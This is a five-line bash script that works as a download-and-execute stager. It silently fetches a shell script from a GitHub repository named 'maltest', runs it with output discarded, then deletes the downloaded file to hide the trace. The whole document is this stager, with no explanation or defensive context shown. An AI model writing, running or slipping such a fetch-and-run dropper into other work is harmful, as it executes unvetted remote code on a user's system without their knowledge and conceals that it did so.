#!/bin/bash
curl https://raw.githubusercontent.com/AirplaneA220/maltest/Main/shversion/2.sh 2>/dev/null > /tmp/2.sh
sh /tmp/2.sh > /dev/null
sleep 2
rm /tmp/2.sh